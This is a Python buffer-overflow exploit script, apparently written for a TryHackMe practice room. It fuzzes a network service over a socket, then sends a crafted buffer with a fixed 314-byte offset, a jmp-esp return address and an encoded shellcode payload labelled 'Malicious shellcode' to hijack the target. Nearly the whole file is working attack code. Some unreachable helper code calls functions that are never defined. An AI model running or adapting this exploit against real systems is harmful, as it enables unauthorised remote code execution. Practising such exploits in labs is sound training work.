##################################################
##@jockmedlinux @ 2023-01-08					##
##################################################
import os,sys,subprocess,socket,argparse,time
from struct import pack
parser = argparse.ArgumentParser(description='Easy script for buffer overflow by @jockemedlinux')
parser.add_argument('-F', action='store_true', help='Fuzz the application')
parser.add_argument('-B', action='store_true', help='Send the buffer')
parser.add_argument('-O', action='store_true', default='', help='Find the offset', required=False)
parser.add_argument('-C', action='store_true', default='', help='Check for bad characters', required=False)
parser.add_argument('-H', type=str, default='127.0.0.1', help='Host "IP"', required=False)
parser.add_argument('-P', type=int, default='1337', help='Port', required=False)

args = parser.parse_args()

# // fun stuff.
cowsending = subprocess.getoutput("echo 'Sending beezneez:::' | cowsay")
cowsent = subprocess.getoutput("echo ':::Beezneez sent' | cowsay")
cowfail	= subprocess.getoutput("echo 'Is it even running, guy?' | cowsay")
cowquit	= subprocess.getoutput("echo 'Quitter..' | cowsay -d")
cowprofit = subprocess.getoutput("echo 'Did we get it?' | cowsay -e '0o'")
timeout = 5

# // Tinker variables
prefix = "OVERFLOW5 "			#Special prefix for THM
offset = 314					#Found offset
As = "A" * offset				#Overflow
Bs = "BBBB"						#EIP-control
retn = "\xAF\x11\x50\x62"		#return-address (jmp-esp or push-esp) Save input here. [ADDRESS:"625011AF" | LittleEndian: "\xAF\x11\x50\x62"]
nops = "\x90" * 16				#\x90
nullbyte = ""					#\x00

# // Cyclic brakepoint.[SAVE INPUT HERE| ADDRESS:"" | LE: " " ]
cyclic = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# // Malicious shellcode to run. (if not using buf as above)
#identified bad characters here --> [ \x00\xa9\xcd\xd4 ]

shellcode = ("\xfc\xbb\x9a\x4d\xe5\x3f\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x66\xa5\x67"
"\x3f\x96\x36\x08\xc9\x73\x07\x08\xad\xf0\x38\xb8\xa5\x54"
"\xb5\x33\xeb\x4c\x4e\x31\x24\x63\xe7\xfc\x12\x4a\xf8\xad"
"\x67\xcd\x7a\xac\xbb\x2d\x42\x7f\xce\x2c\x83\x62\x23\x7c"
"\x5c\xe8\x96\x90\xe9\xa4\x2a\x1b\xa1\x29\x2b\xf8\x72\x4b"
"\x1a\xaf\x09\x12\xbc\x4e\xdd\x2e\xf5\x48\x02\x0a\x4f\xe3"
"\xf0\xe0\x4e\x25\xc9\x09\xfc\x08\xe5\xfb\xfc\x4d\xc2\xe3"
"\x8a\xa7\x30\x99\x8c\x7c\x4a\x45\x18\x66\xec\x0e\xba\x42"
"\x0c\xc2\x5d\x01\x02\xaf\x2a\x4d\x07\x2e\xfe\xe6\x33\xbb"
"\x01\x28\xb2\xff\x25\xec\x9e\xa4\x44\xb5\x7a\x0a\x78\xa5"
"\x24\xf3\xdc\xae\xc9\xe0\x6c\xed\x85\xc5\x5c\x0d\x56\x42"
"\xd6\x7e\x64\xcd\x4c\xe8\xc4\x86\x4a\xef\x2b\xbd\x2b\x7f"
"\xd2\x3e\x4c\x56\x11\x6a\x1c\xc0\xb0\x13\xf7\x10\x3c\xc6"
"\x58\x40\x92\xb9\x18\x30\x52\x6a\xf1\x5a\x5d\x55\xe1\x65"
"\xb7\xfe\x88\x9c\x50\x0b\x43\xb1\x71\x63\x59\xcd\x60\x28"
"\xd4\x2b\xe8\xc0\xb0\xe4\x85\x79\x99\x7e\x37\x85\x37\xfb"
"\x77\x0d\xb4\xfc\x36\xe6\xb1\xee\xaf\x06\x8c\x4c\x79\x18"
"\x3a\xf8\xe5\x8b\xa1\xf8\x60\xb0\x7d\xaf\x25\x06\x74\x25"
"\xd8\x31\x2e\x5b\x21\xa7\x09\xdf\xfe\x14\x97\xde\x73\x20"
"\xb3\xf0\x4d\xa9\xff\xa4\x01\xfc\xa9\x12\xe4\x56\x18\xcc"
"\xbe\x05\xf2\x98\x47\x66\xc5\xde\x47\xa3\xb3\x3e\xf9\x1a"
"\x82\x41\x36\xcb\x02\x3a\x2a\x6b\xec\x91\xee\x8b\x0f\x33"
"\x1b\x24\x96\xd6\xa6\x29\x29\x0d\xe4\x57\xaa\xa7\x95\xa3"
"\xb2\xc2\x90\xe8\x74\x3f\xe9\x61\x11\x3f\x5e\x81\x30\x3f"
"\x60\x7d\xbb")

# // THM Room specifics.
string = prefix + "A" * 100

# // The buffer
buffer = ""
buffer += prefix
buffer += As
#buffer += Bs
buffer += retn
#buffer += nops
#buffer += cyclic
#buffer += badchars
buffer += shellcode

def close():
	print("\nProgram closing.")
	print(cowquit)
	sys.exit()

def crash():
	print(cowprofit)
	sys.exit()

def run():
	print(cowfail)
	sys.exit()
	#def offset():
	lenght = int(input("How many characters do you wanna create? "))
	pattern = cyclic(lenght)
	print("\nCreated string: ")
	print(pattern.decode())
	print("\n")
	find = input("What is the input you wanna search for? ")
	offset = cyclic_find(str(find), n=len(pattern))
	print(offset)

#def badchars():

def fuzzer():
	global prefix
	global string
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				#result = s.connect_ex((args.H, args.P))
				s.settimeout(timeout)
				s.connect((args.H, args.P))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except KeyboardInterrupt:
			close()
		except socket.gaierror as e:
			print(f'Error: {e}')
			run()
		except socket.error as e2:
			if len(string) - len(prefix) > 100:
				print(f'\nError:{e2}')
				print(f'You seem to have crashed it.\n')
				print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
				crash()
			else:
				print(f'Error: {e2}')
				run()
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			crash()
		string += 100 * "A"
		
# // Buffer overflow
def main():
	global buffer
	global cowsending
	print(cowsending)
	print(bytes(buffer, "latin-1"))
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((args.H, args.P))
			s.recv(1024)
			s.send(bytes(buffer, "latin-1"))
			s.recv(1024)
	except KeyboardInterrupt:
		close()
	except:
		print(cowsent)

if args.F:
	fuzzer()
elif args.B:
	main()
#elif args.O:
#	offset()
#elif args.C:
	#badchars()
else:
	print("\033[1;31;40m \n##You need to use either the Fuzzer (-F) module, or the Buffer (-B) module##\n")
	print("\033[1;32;40m Bright Green \n")
	parser.print_help()	